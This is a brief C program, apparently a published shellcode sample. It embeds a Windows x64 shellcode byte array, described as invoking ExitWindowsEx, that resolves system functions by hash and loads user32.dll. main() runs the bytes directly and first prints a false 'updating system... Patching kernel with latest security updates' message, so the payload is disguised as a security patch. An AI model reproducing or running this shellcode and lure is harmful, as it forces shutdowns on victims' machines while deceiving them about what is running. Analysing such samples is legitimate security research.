#include<stdio.h>
#include<string.h>

/*
Windows x64 Shellcode via ExitWindowsEx 
Tested on : Windows 7 Ultimate x64 
Date : Nov 26, 2017 
Coded By : Chaitanya Haritash [@bofheaded] 
Special Thanks : Topher Timzen & Osanda Malith Jayathissa
*/

unsigned char buf[] =
"\x48\x83\xec\x28\x48\x83\xe4\xf0\x65\x4c\x8b\x24\x25\x60\x00\x00\x00\x4d\x8b\x64\x24\x18\x4d\x8b\x64\x24\x20\x4d\x8b\x24\x24\x4d\x8b\x7c\x24"
"\x20\x4d\x8b\x24\x24\x4d\x8b\x64\x24\x20\xba\x8e\x4e\x0e\xec\x4c\x89\xe1\xe8\x54\x00\x00\x00\xeb\x34\x59\xff\xd0\xba\xf5\xbe\xda\x89\x48\x89"
"\xc1\xe8\x42\x00\x00\x00\x48\x89\xc3\x4d\x31\xc9\xeb\x33\x41\x58\xeb\x28\x5a\x48\x31\xc9\xff\xd3\xba\x70\xcd\x3f\x2d\x4c\x89\xf9\xe8\x23\x00"
"\x00\x00\x48\x31\xc9\xff\xd0\xe8\xc7\xff\xff\xff\x75\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\xe8\xd3\xff\xff\xff\x30\x00\xe8\xc8\xff\xff\xff"
"\x30\x00\x49\x89\xcd\x67\x41\x8b\x45\x3c\x67\x45\x8b\xb4\x05\x88\x00\x00\x00\x45\x01\xee\x67\x45\x8b\x56\x18\x67\x41\x8b\x5e\x20\x44\x01\xeb"
"\x67\xe3\x3f\x41\xff\xca\x67\x42\x8b\x34\x93\x44\x01\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x39\xd7\x75\xdd"
"\x67\x41\x8b\x5e\x24\x44\x01\xeb\x31\xc9\x66\x67\x42\x8b\x0c\x53\x67\x41\x8b\x5e\x1c\x44\x01\xeb\x67\x8b\x04\x8b\x44\x01\xe8\xc3";

// Push into memory
int main()
{
   printf("\nPlease Wait, updating system...\nPatching kernel with latest security updates.", strlen(buf));
   void (*ret)() = (void(*)())buf;
   ret();
}
